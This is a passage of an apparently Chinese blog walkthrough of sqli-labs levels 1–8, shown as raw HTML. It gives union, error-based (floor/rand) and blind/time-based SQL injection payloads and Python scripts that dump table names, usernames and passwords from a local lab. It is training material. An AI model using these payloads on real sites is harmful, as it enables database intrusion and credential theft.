class="string">&#x27; --+</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(username ,id , password) from users--+</span></span><br></pre></td></tr></table></figure>

<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>变数字型其余同上</p>
<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p><code>&#39;&#39;</code>包围变成<code>(&#39;&#39;)</code>包围<br><code>&#39;</code>换成<code>&#39;)</code>其余同上</p>
<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>变成<code>(&quot;&quot;)</code>包围<br>换成<code>&quot;)</code>其余同上</p>
<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>布尔盲注，有报错反馈</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;报错</span></span><br><span class="line"><span class="string">?id=1&#x27;</span><span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and length((select database()))=8--+</span></span><br></pre></td></tr></table></figure>
<p>不想手注，抄了别人的代码[<a href="https://www.cnblogs.com/cmx666/p/15119740.html]">https://www.cnblogs.com/cmx666/p/15119740.html]</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/Less-5/&quot;</span></span><br><span class="line"></span><br><span class="line">normalHtmlLen = <span class="built_in">len</span>(requests.get(url=url+<span class="string">&quot;?id=1&quot;</span>).text)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The len of HTML:&quot;</span>+<span class="built_in">str</span>(normalHtmlLen))</span><br><span class="line"></span><br><span class="line">dbNameLen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    dbNameLen_url = url + <span class="string">&quot;?id=1&#x27;+and+length(database())=&quot;</span>+<span class="built_in">str</span>(dbNameLen)+<span class="string">&quot;--+&quot;</span></span><br><span class="line">    <span class="comment">#print(dbNameLen_url)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dbNameLen_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The len of dbName:&quot;</span>+<span class="built_in">str</span>(dbNameLen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> dbNameLen == <span class="number">30</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    dbNameLen += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">dbName = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, dbNameLen+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">        dbName_url = url + <span class="string">&quot;?id=1&#x27;+and+substr(database(),&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,1)=&#x27;&quot;</span>+a+<span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line">        <span class="comment">#print(dbName_url)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dbName_url).text) == normalHtmlLen:</span><br><span class="line">            dbName += a</span><br><span class="line">            <span class="built_in">print</span>(dbName)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后浅加了个查表的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">normalHtmlLen = <span class="built_in">len</span>(requests.get(url=url + <span class="string">&quot;?id=1&quot;</span>).text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The len of HTML: &quot;</span> + <span class="built_in">str</span>(normalHtmlLen))</span><br><span class="line"></span><br><span class="line">tableNameLen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    tableNameLen_url = url + <span class="string">&quot;?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0, 1))=&quot;</span> + <span class="built_in">str</span>(tableNameLen) + <span class="string">&quot;--+&quot;</span></span><br><span class="line">    response = requests.get(tableNameLen_url)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="built_in">len</span>(response.text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The len of table name: &quot;</span> + <span class="built_in">str</span>(tableNameLen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tableNameLen == <span class="number">50</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    tableNameLen += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">tableName = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tableNameLen + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">        tableName_url = url + <span class="string">&quot;?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 0, 1),&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1)=&#x27;&quot;</span> + a + <span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line">        response = requests.get(tableName_url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="built_in">len</span>(response.text) == normalHtmlLen:</span><br><span class="line">            tableName += a</span><br><span class="line">            <span class="built_in">print</span>(tableName)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>但是想起了不止一个表，求教chat老师（）后</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">normalHtmlLen = <span class="built_in">len</span>(requests.get(url=url + <span class="string">&quot;?id=1&quot;</span>).text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The len of HTML: &quot;</span> + <span class="built_in">str</span>(normalHtmlLen))</span><br><span class="line"></span><br><span class="line">tableNames = []</span><br><span class="line"></span><br><span class="line">tableIndex = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    tableNameLen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        tableNameLen_url = url + <span class="string">&quot;?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit &quot;</span> + <span class="built_in">str</span>(tableIndex) + <span class="string">&quot;, 1))=&quot;</span> + <span class="built_in">str</span>(tableNameLen) + <span class="string">&quot;--+&quot;</span></span><br><span class="line">        response = requests.get(tableNameLen_url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="built_in">len</span>(response.text) == normalHtmlLen:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> tableNameLen == <span class="number">50</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        tableNameLen += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tableNameLen == <span class="number">50</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    tableName = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tableNameLen + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">            tableName_url = url + <span class="string">&quot;?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit &quot;</span> + <span class="built_in">str</span>(tableIndex) + <span class="string">&quot;, 1),&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1)=&#x27;&quot;</span> + a + <span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line">            response = requests.get(tableName_url)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="built_in">len</span>(response.text) == normalHtmlLen:</span><br><span class="line">                tableName += a</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tableName:</span><br><span class="line">        tableNames.append(tableName)</span><br><span class="line"></span><br><span class="line">    tableIndex += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Table names:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> tableName <span class="keyword">in</span> tableNames:</span><br><span class="line">    <span class="built_in">print</span>(tableName)</span><br></pre></td></tr></table></figure>
<p>查列</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">normalHtmlLen = <span class="built_in">len</span>(requests.get(url=url + <span class="string">&quot;?id=1&quot;</span>).text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The len of HTML: &quot;</span> + <span class="built_in">str</span>(normalHtmlLen))</span><br><span class="line"></span><br><span class="line">columnNames = []</span><br><span class="line"></span><br><span class="line">tableIndex = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    columnNameLen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        columnNameLen_url = url + <span class="string">&quot;?id=1&#x27; and length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit &quot;</span> + <span class="built_in">str</span>(tableIndex) + <span class="string">&quot;, 1))=&quot;</span> + <span class="built_in">str</span>(columnNameLen) + <span class="string">&quot;--+&quot;</span></span><br><span class="line">        response = requests.get(columnNameLen_url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="built_in">len</span>(response.text) == normalHtmlLen:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> columnNameLen == <span class="number">50</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        columnNameLen += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> columnNameLen == <span class="number">50</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    columnName = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, columnNameLen + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_lowercase + string.digits:  <span class="comment"># 包括字母和数字</span></span><br><span class="line">            columnName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit &quot;</span> + <span class="built_in">str</span>(tableIndex) + <span class="string">&quot;, 1),&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1))=&quot;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(char)) + <span class="string">&quot;--+&quot;</span></span><br><span class="line">            response = requests.get(columnName_url)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="built_in">len</span>(response.text) == normalHtmlLen:</span><br><span class="line">                columnName += char</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> columnName:</span><br><span class="line">        columnNames.append(columnName)</span><br><span class="line"></span><br><span class="line">    tableIndex += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Column names in &#x27;users&#x27; table:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> columnName <span class="keyword">in</span> columnNames:</span><br><span class="line">    <span class="built_in">print</span>(columnName)</span><br></pre></td></tr></table></figure>

<p>然后我顺手搜了一下发现了个特别特别好的()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">db_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table_list = []</span><br><span class="line">column_list = []</span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://127.0.0.1/Less-5/?id=1&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">### 获取当前数据库名 ###</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;当前数据库名:&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;&#x27; and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select database()),0x3a,floor(rand(0)*2)))--+&#x27;&#x27;&#x27;</span></span><br><span class="line">r = requests.get(url+payload)</span><br><span class="line">db_name = r.text.split(<span class="string">&#x27;:&#x27;</span>)[-<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]&#x27;</span> + db_name)</span><br><span class="line"><span class="comment">### 获取表名 ###</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;数据库%s下的表名:&#x27;</span> % db_name)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    payload = <span class="string">&#x27;&#x27;&#x27;&#x27; and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select table_name from information_schema.tables where table_schema=&#x27;%s&#x27; limit %d,1),0x3a,floor(rand(0)*2)))--+&#x27;&#x27;&#x27;</span> % (db_name,i)</span><br><span class="line">    r = requests.get(url+payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;group_key&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    table_name = r.text.split(<span class="string">&#x27;:&#x27;</span>)[-<span class="number">2</span>]</span><br><span class="line">    table_list.append(table_name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]&#x27;</span> + table_name)</span><br><span class="line"><span class="comment">### 获取列名 ###</span></span><br><span class="line"><span class="comment">#### 这里以users表为例 ####</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;%s表下的列名:&#x27;</span> % table_list[-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    payload = <span class="string">&#x27;&#x27;&#x27;&#x27; and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select column_name from information_schema.columns where table_name=&#x27;%s&#x27; limit %d,1),0x3a,floor(rand(0)*2)))--+&#x27;&#x27;&#x27;</span> % (table_list[-<span class="number">1</span>],i)</span><br><span class="line">    r = requests.get(url + payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;group_key&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    column_name = r.text.split(<span class="string">&#x27;:&#x27;</span>)[-<span class="number">2</span>]</span><br><span class="line">    column_list.append(column_name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]&#x27;</span> + column_name)</span><br><span class="line"><span class="comment">### 获取字段值 ###</span></span><br><span class="line"><span class="comment">#### 这里以username列为例 ####</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;%s列下的字段值:&#x27;</span> % column_list[-<span class="number">2</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    payload = <span class="string">&#x27;&#x27;&#x27;&#x27; and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select %s from %s.%s limit %d,1),0x3a,floor(rand(0)*2)))--+&#x27;&#x27;&#x27;</span> % (column_list[-<span class="number">2</span>],db_name,table_list[-<span class="number">1</span>],i)</span><br><span class="line">    r = requests.get(url + payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;group_key&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    dump = r.text.split(<span class="string">&#x27;:&#x27;</span>)[-<span class="number">2</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]&#x27;</span> + dump)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#### password ####</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;%s列下的字段值:&#x27;</span> % column_list[-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    payload = <span class="string">&#x27;&#x27;&#x27;&#x27; and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select %s from %s.%s limit %d,1),0x3a,floor(rand(0)*2)))--+&#x27;&#x27;&#x27;</span> % (column_list[-<span class="number">1</span>],db_name,table_list[-<span class="number">1</span>],i)</span><br><span class="line">    r = requests.get(url + payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;group_key&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    dump = r.text.split(<span class="string">&#x27;:&#x27;</span>)[-<span class="number">2</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]&#x27;</span> + dump)</span><br></pre></td></tr></table></figure>

<p>但是问题来了家人们。。。我现在发现这题可以floor()报错注入<br><a href="https://blog.csdn.net/Leep0rt/article/details/78556440">详细讲解双查询注入</a></p>
<p><code>?id=1&#39; and(select 1 from (select count(*),concat((select concat(username,&#39;: &#39;,password,&#39;;&#39;) from security.users limit 1,1),floor(rand()*2)) as x from security.users group by x) as a)--+</code></p>
<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p><code>&quot;</code>包裹，其余同上</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">db_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table_list = []</span><br><span class="line">column_list = []</span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://127.0.0.1/Less-6/?id=1&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">### 获取当前数据库名 ###</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;当前数据库名:&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;&quot;and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select database()),0x3a,floor(rand(0)*2)))--+&#x27;&#x27;&#x27;</span></span><br><span class="line">r = requests.get(url+payload)</span><br><span class="line">db_name = r.text.split(<span class="string">&#x27;:&#x27;</span>)[-<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]&#x27;</span> + db_name)</span><br><span class="line"><span class="comment">### 获取表名 ###</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;数据库%s下的表名:&#x27;</span> % db_name)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    payload = <span class="string">&#x27;&#x27;&#x27;&quot; and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select table_name from information_schema.tables where table_schema=&#x27;%s&#x27; limit %d,1),0x3a,floor(rand(0)*2)))--+&#x27;&#x27;&#x27;</span> % (db_name,i)</span><br><span class="line">    r = requests.get(url+payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;group_key&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    table_name = r.text.split(<span class="string">&#x27;:&#x27;</span>)[-<span class="number">2</span>]</span><br><span class="line">    table_list.append(table_name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]&#x27;</span> + table_name)</span><br><span class="line"><span class="comment">### 获取列名 ###</span></span><br><span class="line"><span class="comment">#### 这里以users表为例 ####</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;%s表下的列名:&#x27;</span> % table_list[-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    payload = <span class="string">&#x27;&#x27;&#x27;&quot; and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select column_name from information_schema.columns where table_name=&#x27;%s&#x27; limit %d,1),0x3a,floor(rand(0)*2)))--+&#x27;&#x27;&#x27;</span> % (table_list[-<span class="number">1</span>],i)</span><br><span class="line">    r = requests.get(url + payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;group_key&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    column_name = r.text.split(<span class="string">&#x27;:&#x27;</span>)[-<span class="number">2</span>]</span><br><span class="line">    column_list.append(column_name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]&#x27;</span> + column_name)</span><br><span class="line"><span class="comment">### 获取字段值 ###</span></span><br><span class="line"><span class="comment">#### 这里以username列为例 ####</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;%s列下的字段值:&#x27;</span> % column_list[-<span class="number">2</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    payload = <span class="string">&#x27;&#x27;&#x27;&quot; and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select %s from %s.%s limit %d,1),0x3a,floor(rand(0)*2)))--+&#x27;&#x27;&#x27;</span> % (column_list[-<span class="number">2</span>],db_name,table_list[-<span class="number">1</span>],i)</span><br><span class="line">    r = requests.get(url + payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;group_key&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    dump = r.text.split(<span class="string">&#x27;:&#x27;</span>)[-<span class="number">2</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]&#x27;</span> + dump)</span><br><span class="line"></span><br><span class="line"><span class="comment">#### password ####</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;%s列下的字段值:&#x27;</span> % column_list[-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    payload = <span class="string">&#x27;&#x27;&#x27;&quot; and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select %s from %s.%s limit %d,1),0x3a,floor(rand(0)*2)))--+&#x27;&#x27;&#x27;</span> % (column_list[-<span class="number">1</span>],db_name,table_list[-<span class="number">1</span>],i)</span><br><span class="line">    r = requests.get(url + payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;group_key&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    dump = r.text.split(<span class="string">&#x27;:&#x27;</span>)[-<span class="number">2</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]&#x27;</span> + dump)</span><br></pre></td></tr></table></figure>
<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>双括号。。但是脚本跑不起来。。本来看到outfile打算试试导出文件了，结果老不成功。。</p>
<p><a href="https://bbs.kanxue.com/thread-248375.htm">[原创]sqli-labs靶场第七关文件无法写入</a><br><a href="https://zhuanlan.zhihu.com/p/379682771">你没有权限在此位置中保存文件</a><br><a href="https://zhuanlan.zhihu.com/p/403961135">找不到 gpedit.msc 的最优解决办法</a><br>搜不到别的问题了，遂放弃</p>
<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>盲注来了，盲注真的来了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">time_tools</span>(<span class="params">target_url, payload</span>):</span><br><span class="line">    start_time = datetime.datetime.now()</span><br><span class="line">    response = requests.get(target_url + payload)</span><br><span class="line">    end_time = datetime.datetime.now()</span><br><span class="line">    sec = (end_time - start_time).seconds</span><br><span class="line">    <span class="keyword">return</span> sec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_length</span>(<span class="params">target_url</span>):</span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        payload = <span class="string">&quot;?id=1&#x27; and if(length(database())=&#123;&#125;,sleep(1),0)--+&quot;</span>.<span class="built_in">format</span>(length)</span><br><span class="line">        sec = time_tools(target_url, payload)</span><br><span class="line">        <span class="keyword">if</span> sec &gt;= <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Database length is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(length))</span><br><span class="line">            <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_name</span>(<span class="params">target_url</span>):</span><br><span class="line">    db_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    db_length = get_database_length(target_url)</span><br><span class="line">    letters = string.ascii_lowercase + <span class="string">&quot;_&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, db_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> letter <span class="keyword">in</span> letters:</span><br><span class="line">            payload = <span class="string">&quot;?id=1&#x27; and substring(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; --+&quot;</span>.<span class="built_in">format</span>(i, letter)</span><br><span class="line">            html_content = requests.get(target_url + payload).text</span><br><span class="line">            result = re.findall(<span class="string">&quot;You are in...........&quot;</span>, html_content)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                db_name += letter</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Database name is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(db_name))</span><br><span class="line">    <span class="keyword">return</span> db_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_table_name_length</span>(<span class="params">target_url</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    爆表、列、字段原理一样,爆出表后改一下payload爆其他数据</span></span><br><span class="line"><span class="string">    爆数据：</span></span><br><span class="line"><span class="string">    &quot;?id=1&#x27; and length((select concat(username,0x3a,password)from users limit &#123;&#125;,1))=&#123;&#125;--+&quot;</span></span><br><span class="line"><span class="string">    爆列：</span></span><br><span class="line"><span class="string">    &quot;?id=1&#x27; and length((select column_name from information_schema.columns &quot; \</span></span><br><span class="line"><span class="string">                      &quot;where table_schema=database() and table_name=&#x27;users&#x27; limit &#123;&#125;,1))=&#123;&#125;--+&quot;</span></span><br><span class="line"><span class="string">    爆表：</span></span><br><span class="line"><span class="string">    &quot;?id=1&#x27; and length((select table_name from information_schema.tables &quot; \</span></span><br><span class="line"><span class="string">                      &quot;where table_schema=database() and table_name=&#x27;users&#x27; limit &#123;&#125;,1))=&#123;&#125;--+&quot;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    table_name_length = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">            payload = <span 